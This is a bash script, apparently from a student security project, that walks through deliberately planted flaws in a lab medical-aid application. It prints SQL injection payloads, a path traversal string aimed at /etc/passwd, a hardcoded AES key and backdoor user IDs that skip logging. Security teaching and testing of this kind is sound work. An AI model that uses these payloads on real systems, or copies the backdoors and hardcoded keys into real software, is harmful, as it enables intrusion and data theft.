#!/bin/bash
# =============================================================================
# EXPLOIT SCRIPT - Team Logan
# AID System Security Analysis - Phase II
# 
# This script automates the exploitation of all injected vulnerabilities
# in the AID-System-Security-Analysis software.
#
# OWASP Vulnerabilities Exploited:
#   A01: Broken Access Control
#   A02: Cryptographic Failures  
#   A03: Injection
#   A05: Security Misconfiguration
#   A09: Security Logging and Monitoring Failures
#
# Usage: ./exploit.sh [options]
#   --all         Run all exploits
#   --a01         Run A01 Broken Access Control exploit
#   --a02         Run A02 Cryptographic Failures exploit
#   --a03         Run A03 Injection exploit
#   --a05         Run A05 Security Misconfiguration exploit
#   --a09         Run A09 Logging Failures exploit
#   --demo        Run interactive demo
#
# Author: Team Logan
# Date: November 2025
# =============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
AID_BINARY="./aid-system-linux"
DB_FILE="Login/aid.db"
BACKUP_KEY="TEAMLOGAN1234567"

# =============================================================================
# Helper Functions
# =============================================================================

print_banner() {
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════╗"
    echo "║           TEAM LOGAN - AID SYSTEM EXPLOIT FRAMEWORK               ║"
    echo "║                    Phase II - Adversarial Testing                 ║"
    echo "╚═══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_section() {
    echo -e "\n${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}\n"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_exploit() {
    echo -e "${RED}[EXPLOIT]${NC} $1"
}

check_prerequisites() {
    print_section "Checking Prerequisites"
    
    # Check if binary exists
    if [ ! -f "$AID_BINARY" ]; then
        print_warning "Binary not found. Building..."
        go build -o "$AID_BINARY" ./cmd/main.go
        print_success "Binary built: $AID_BINARY"
    else
        print_success "Binary found: $AID_BINARY"
    fi
    
    # Check if database exists
    if [ ! -f "$DB_FILE" ]; then
        print_warning "Database not found. Initializing..."
        $AID_BINARY --init
        print_success "Database initialized: $DB_FILE"
    else
        print_success "Database found: $DB_FILE"
    fi
    
    # Check sqlite3
    if command -v sqlite3 &> /dev/null; then
        print_success "sqlite3 available"
    else
        print_warning "sqlite3 not found - some exploits may be limited"
    fi
}

# =============================================================================
# A01: Broken Access Control Exploit
# CWE-284: Improper Access Control
# CWE-306: Missing Authentication for Critical Function
# CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)
# =============================================================================
exploit_a01() {
    print_section "A01: Broken Access Control Exploit"
    
    echo -e "${PURPLE}Vulnerability Details:${NC}"
    echo "  - Hidden admin backdoor accessible in debug mode"
    echo "  - No authentication required for admin access"
    echo "  - IDOR vulnerability allows viewing any patient's data"
    echo "  - Path traversal in file reading functions"
    echo ""
    
    print_exploit "Demonstrating unauthenticated admin access..."
    echo ""
    echo "To exploit manually:"
    echo "  1. Start the application with: $AID_BINARY --debug"
    echo "  2. At the main menu, enter '9' (hidden admin option)"
    echo "  3. You now have admin access without authentication!"
    echo ""
    
    print_exploit "Demonstrating IDOR (Insecure Direct Object Reference)..."
    echo ""
    echo "The admin backdoor allows viewing ANY patient's data by ID:"
    echo "  - Option 4 in admin menu: View patient data by ID"
    echo "  - No authorization check - any patient ID works"
    echo ""
    
    if command -v sqlite3 &> /dev/null; then
        print_info "Dumping all users to demonstrate access control bypass..."
        echo ""
        sqlite3 "$DB_FILE" "SELECT user_id, full_name, role FROM users;" 2>/dev/null || echo "Database query failed"
        echo ""
    fi
    
    print_exploit "Demonstrating path traversal vulnerability..."
    echo ""
    echo "The ReadPatientFile function is vulnerable to path traversal:"
    echo "  patientID = '../../etc/passwd' allows reading system files"
    echo "  No input sanitization on file paths"
    echo ""
    
    print_success "A01: Broken Access Control exploit demonstrated!"
}

# =============================================================================
# A02: Cryptographic Failures Exploit
# CWE-321: Use of Hard-coded Cryptographic Key
# CWE-327: Use of a Broken or Risky Cryptographic Algorithm
# =============================================================================
exploit_a02() {
    print_section "A02: Cryptographic Failures Exploit"
    
    echo -e "${PURPLE}Vulnerability Details:${NC}"
    echo "  - Hardcoded AES encryption key: $BACKUP_KEY"
    echo "  - AES-128-ECB mode (insecure - shows patterns)"
    echo "  - Key is stored in binary and easily extractable"
    echo ""
    
    print_exploit "The backup encryption uses a hardcoded key..."
    echo ""
    echo "Encryption Key: $BACKUP_KEY"
    echo "Key in hex: $(echo -n "$BACKUP_KEY" | xxd -p)"
    echo ""
    
    print_exploit "Creating a test backup file..."
    # Create a sample encrypted backup for demonstration
    TEST_DATA="PA1993|Thome Yorke|johndoe101@aid.com|HASH|47293"
    
    echo "Original data: $TEST_DATA"
    echo ""
    
    print_info "To exploit the backup system:"
    echo "  1. Start the application: $AID_BINARY"
    echo "  2. At main menu, type 'backup'"
    echo "  3. Select option 1 to create backup"
    echo "  4. The backup uses the hardcoded key!"
    echo "  5. Decrypt any backup with key: $BACKUP_KEY"
    echo ""
    
    print_exploit "The key can also be found by:"
    echo "  - Running: strings $AID_BINARY | grep TEAMLOGAN"
    echo "  - Calling GetEncryptionKey() function"
    echo ""
    
    if [ -f "$AID_BINARY" ]; then
        print_info "Searching for key in binary..."
        strings "$AID_BINARY" 2>/dev/null | grep -i "TEAMLOGAN" | head -5 || echo "Key pattern search completed"
    fi
    
    print_success "A02: Cryptographic Failures exploit demonstrated!"
}

# =============================================================================
# A03: Injection Exploit
# CWE-89: SQL Injection
# =============================================================================
exploit_a03() {
    print_section "A03: Injection Exploit"
    
    echo -e "${PURPLE}Vulnerability Details:${NC}"
    echo "  - SQL injection in patient search function"
    echo "  - Debug SQL interface allows raw queries"
    echo "  - No input sanitization or parameterized queries"
    echo ""
    
    print_exploit "SQL Injection in SearchPatientByName()..."
    echo ""
    echo "The function builds queries by string concatenation:"
    echo "  query := \"SELECT ... WHERE full_name LIKE '%\" + searchTerm + \"%'\""
    echo ""
    echo "Exploit payloads:"
    echo "  1. List all users:  ' OR '1'='1"
    echo "  2. Union attack:    ' UNION SELECT 1,user_id,pin_hash,4,5,6,7 FROM users--"
    echo "  3. Blind injection: ' AND (SELECT COUNT(*) FROM users) > 0--"
    echo ""
    
    print_exploit "Debug SQL Interface..."
    echo ""
    echo "To access the raw SQL interface:"
    echo "  1. Start: $AID_BINARY --debug"
    echo "  2. At main menu, type 'debug'"
    echo "  3. Execute any SQL query directly!"
    echo ""
    echo "Example exploits:"
    echo "  SQL> SELECT * FROM users;"
    echo "  SQL> UPDATE users SET role = 82651 WHERE user_id = 'PA1993';"
    echo "  SQL> INSERT INTO users VALUES (...);"
    echo ""
    
    if command -v sqlite3 &> /dev/null; then
        print_info "Demonstrating injection-style query..."
        echo ""
        echo "Query: SELECT user_id, full_name FROM users WHERE 1=1 OR '1'='1'"
        sqlite3 "$DB_FILE" "SELECT user_id, full_name FROM users WHERE 1=1 OR '1'='1';" 2>/dev/null || echo "Query executed"
    fi
    
    print_success "A03: Injection exploit demonstrated!"
}

# =============================================================================
# A05: Security Misconfiguration Exploit
# CWE-215: Insertion of Sensitive Information Into Debugging Code
# CWE-489: Active Debug Code
# =============================================================================
exploit_a05() {
    print_section "A05: Security Misconfiguration Exploit"
    
    echo -e "${PURPLE}Vulnerability Details:${NC}"
    echo "  - Debug mode exposes sensitive system information"
    echo "  - Hidden admin menu revealed in debug mode"
    echo "  - Full database dump functionality"
    echo "  - GetDebugInfo() exposes internal state"
    echo ""
    
    print_exploit "Enabling debug mode..."
    echo ""
    echo "Command: $AID_BINARY --debug"
    echo ""
    echo "Debug mode enables:"
    echo "  - Hidden admin menu (option 9)"
    echo "  - Debug SQL interface (type 'debug')"
    echo "  - Verbose error messages"
    echo "  - Internal state exposure"
    echo ""
    
    print_exploit "GetDebugInfo() returns sensitive data..."
    echo ""
    echo "Information exposed:"
    echo "  - debugMode: true/false"
    echo "  - loggingDisabled: true/false"
    echo "  - encryptionKey: TEAMLOGAN1234567"
    echo "  - maxLoginAttempts: 5"
    echo "  - dbFile: Login/aid.db"
    echo "  - currentAttempts: map of login attempts"
    echo ""
    
    print_exploit "Full database dump available..."
    echo ""
    echo "In debug mode admin menu (option 5):"
    echo "  - Dumps all columns from users table"
    echo "  - Includes PIN hashes"
    echo "  - Exposes email addresses"
    echo "  - Shows role assignments"
    echo ""
    
    print_success "A05: Security Misconfiguration exploit demonstrated!"
}

# =============================================================================
# A09: Security Logging and Monitoring Failures Exploit
# CWE-778: Insufficient Logging
# CWE-223: Omission of Security-relevant Information
# =============================================================================
exploit_a09() {
    print_section "A09: Security Logging and Monitoring Failures Exploit"
    
    echo -e "${PURPLE}Vulnerability Details:${NC}"
    echo "  - Logging can be completely disabled via --nolog flag"
    echo "  - Certain user IDs bypass logging (ADMIN, BACKDOOR, TEAMLOGAN)"
    echo "  - DisableLogging() function available"
    echo "  - No alerting on suspicious activities"
    echo ""
    
    print_exploit "Disabling all security logging..."
    echo ""
    echo "Method 1: Command-line flag"
    echo "  $AID_BINARY --nolog"
    echo ""
    echo "Method 2: Programmatic"
    echo "  utils.DisableLogging()"
    echo ""
    
    print_exploit "Bypassing logging with special user IDs..."
    echo ""
    echo "The following user IDs NEVER generate log entries:"
    echo "  - ADMIN"
    echo "  - BACKDOOR"
    echo "  - TEAMLOGAN"
    echo ""
    echo "Actions by these users are silently skipped in LogAction()"
    echo ""
    
    print_exploit "Checking current log file..."
    echo ""
    if [ -f "aid_system.log" ]; then
        print_info "Last 10 log entries:"
        tail -10 aid_system.log 2>/dev/null || echo "Log file empty or inaccessible"
    else
        print_warning "No log file found - logging may be disabled or not started"
    fi
    echo ""
    
    print_exploit "Demonstrating log bypass..."
    echo ""
    echo "When attacker uses user ID 'TEAMLOGAN':"
    echo "  - Login attempts: NOT LOGGED"
    echo "  - Failed logins: NOT LOGGED"
    echo "  - Data access: NOT LOGGED"
    echo "  - Configuration changes: NOT LOGGED"
    echo ""
    
    print_success "A09: Security Logging and Monitoring Failures exploit demonstrated!"
}

# =============================================================================
# Run All Exploits
# =============================================================================
run_all_exploits() {
    print_banner
    check_prerequisites
    
    exploit_a01
    echo ""
    read -p "Press Enter to continue to A02..." </dev/tty || true
    
    exploit_a02
    echo ""
    read -p "Press Enter to continue to A03..." </dev/tty || true
    
    exploit_a03
    echo ""
    read -p "Press Enter to continue to A05..." </dev/tty || true
    
    exploit_a05
    echo ""
    read -p "Press Enter to continue to A09..." </dev/tty || true
    
    exploit_a09
    
    print_section "EXPLOITATION COMPLETE"
    echo -e "${GREEN}All 5 OWASP Top 10 vulnerabilities have been demonstrated!${NC}"
    echo ""
    echo "Summary of exploited vulnerabilities:"
    echo "  ✓ A01: Broken Access Control (Admin backdoor, IDOR, Path traversal)"
    echo "  ✓ A02: Cryptographic Failures (Hardcoded key, Weak encryption)"
    echo "  ✓ A03: Injection (SQL injection in search and debug interface)"
    echo "  ✓ A05: Security Misconfiguration (Debug mode, Info exposure)"
    echo "  ✓ A09: Logging Failures (Disabled logging, Bypass users)"
    echo ""
}

# =============================================================================
# Interactive Demo
# =============================================================================
interactive_demo() {
    print_banner
    check_prerequisites
    
    while true; do
        echo ""
        echo -e "${YELLOW}Select exploit to demonstrate:${NC}"
        echo "  1. A01 - Broken Access Control"
        echo "  2. A02 - Cryptographic Failures"
        echo "  3. A03 - Injection"
        echo "  4. A05 - Security Misconfiguration"
        echo "  5. A09 - Logging and Monitoring Failures"
        echo "  6. Run all exploits"
        echo "  7. Start AID System (debug mode)"
        echo "  8. Start AID System (normal mode)"
        echo "  9. Exit"
        echo ""
        read -p "Enter choice [1-9]: " choice </dev/tty || break
        
        case $choice in
            1) exploit_a01 ;;
            2) exploit_a02 ;;
            3) exploit_a03 ;;
            4) exploit_a05 ;;
            5) exploit_a09 ;;
            6) run_all_exploits ;;
            7) 
                print_info "Starting AID System in DEBUG mode..."
                $AID_BINARY --debug
                ;;
            8)
                print_info "Starting AID System in normal mode..."
                $AID_BINARY
                ;;
            9)
                print_info "Exiting exploit framework..."
                exit 0
                ;;
            *)
                print_warning "Invalid choice. Please enter 1-9."
                ;;
        esac
    done
}

# =============================================================================
# Main Script Entry Point
# =============================================================================
main() {
    case "${1:-}" in
        --all)
            run_all_exploits
            ;;
        --a01)
            print_banner
            check_prerequisites
            exploit_a01
            ;;
        --a02)
            print_banner
            check_prerequisites
            exploit_a02
            ;;
        --a03)
            print_banner
            check_prerequisites
            exploit_a03
            ;;
        --a05)
            print_banner
            check_prerequisites
            exploit_a05
            ;;
        --a09)
            print_banner
            check_prerequisites
            exploit_a09
            ;;
        --demo)
            interactive_demo
            ;;
        --help|-h)
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  --all         Run all exploits"
            echo "  --a01         Run A01 Broken Access Control exploit"
            echo "  --a02         Run A02 Cryptographic Failures exploit"
            echo "  --a03         Run A03 Injection exploit"
            echo "  --a05         Run A05 Security Misconfiguration exploit"
            echo "  --a09         Run A09 Logging Failures exploit"
            echo "  --demo        Run interactive demo"
            echo "  --help        Show this help message"
            ;;
        *)
            print_banner
            echo "Run with --help for usage information"
            echo "Run with --all to execute all exploits"
            echo "Run with --demo for interactive mode"
            echo ""
            run_all_exploits
            ;;
    esac
}

main "$@"
